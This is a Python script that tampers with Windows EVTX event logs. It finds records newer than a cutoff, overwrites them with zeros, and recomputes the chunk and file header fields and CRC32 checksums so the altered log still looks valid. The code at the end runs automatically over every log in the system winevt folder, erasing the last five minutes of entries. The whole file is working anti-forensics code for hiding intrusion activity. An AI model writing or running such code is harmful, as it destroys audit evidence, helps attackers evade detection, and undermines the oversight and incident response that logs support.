import binascii, math, time, os, random
from datetime import datetime, timedelta

class EventLog:
        def bytesToNumber(self, bytes): 
                #read a little endian byte sequence to a number
                number = 0
                exp = 0
                
                for byte in bytes:
                        number += ord(byte) * 256**exp
                        exp += 1
                        
                return number
        
        def numberToBytes(self, number, length): 
                #read a number to a little endian byte sequence
                bytes = ""
                number = int(number)
                for i in range(0, length):
                        bytes += chr(number % 256)
                        number = (number-(number%256))/256
                        
                return bytes
        
        def timeToFiletime(self, utcTime):
                return 116444736000000000 + (time.mktime(utcTime) * 10000000)
        
        def wipeRecentEventLogs(self, path, maxTimestamp):
                maxTimestamp = self.timeToFiletime(maxTimestamp)
                f = open(path, "r+b")
                header = f.read(4096)
                firstChunk = self.bytesToNumber(header[8:16])
                numChunks = self.bytesToNumber(header[42:44])
                
                record = f.read(8)
                blankOffset = 4096+8
                recordId = None
                recordOffset = None
                while record != "":
                        if record[0:4] == "**\x00\x00":
                                #found a new record, read rest of it into memory
                                record += f.read(self.bytesToNumber(record[4:8]) - 8)
                                #if the timestamp > max, get ready to delete stuff
                                if record[-4:] == record[4:8] and self.bytesToNumber(record[16:24]) >= maxTimestamp:
                                        recordId = self.bytesToNumber(record[8:16])                             
                                        break
                                recordOffset = blankOffset - 8
                                blankOffset += self.bytesToNumber(record[4:8]) - 8
                                
                        record = f.read(8)
                        blankOffset += 8
        
                if recordId:
                        blankOffset -= 8
                        f.seek(blankOffset)
                        length = len(f.read())
                        f.seek(blankOffset)
                        f.write("\x00"*length)
                        
                        # Work out what chunk we're in, how many chunks we just overwrote
                        currentChunk = math.floor((blankOffset-4096)/65536)
                        overwroteChunks = math.floor(length/65536)
                        chunkOffset = int(currentChunk)*65536+4096
                        f.seek(chunkOffset)
                        chunkHeader = f.read(512)
                        chunkHeader = chunkHeader[:16] \
                                                + self.numberToBytes(recordId - 1, 8) \
                                                + chunkHeader[24:32] \
                                                + self.numberToBytes(recordId - 1, 8) \
                                                + chunkHeader[40:44] \
                                                + self.numberToBytes(recordOffset - chunkOffset, 4) \
                                                + self.numberToBytes(blankOffset - chunkOffset, 4) \
                                                + chunkHeader[52:]
                        chunkData = f.read((blankOffset-chunkOffset)-512)
                        chunkHeader = chunkHeader[:52] \
                                                + self.numberToBytes(binascii.crc32(chunkData, 0) & 0xffffffff, 4) \
                                                + chunkHeader[56:]
                        
                        chunkHeader = chunkHeader[:124] \
                                                + self.numberToBytes(binascii.crc32(chunkHeader[:120]\
                                                + chunkHeader[128:512], 0) & 0xffffffff, 4) \
                                                + chunkHeader[128:]
                                                
                        f.seek(chunkOffset)
                        f.write(chunkHeader)
                        
                        header = header[:16] \
                                   + self.numberToBytes(currentChunk + firstChunk, 8) \
                                   + self.numberToBytes(recordId, 8) \
                                   + header[32:42] \
                                   + self.numberToBytes(currentChunk + 1, 2) \
                                   + header[44:]
                                   
                        header = header[:124] \
                                   + self.numberToBytes(binascii.crc32(header[:120], 0) & 0xffffffff, 4) \
                                   + header[128:]
                        f.seek(0)
                        f.write(header)
                        
                f.close()

syspath = "C:/Windows/System32/winevt/Logs/"
if not os.path.isfile(syspath + "System.evtx"):
        syspath = "C:/Windows/Sysnative/winevt/Logs/"

for file in os.listdir(syspath):
        if time.localtime(os.stat(syspath+file)[8]) > datetime.timetuple(datetime.now() - timedelta(minutes=5)):
                EventLog().wipeRecentEventLogs(syspath + file, datetime.timetuple(datetime.now() - timedelta(minutes=5)))

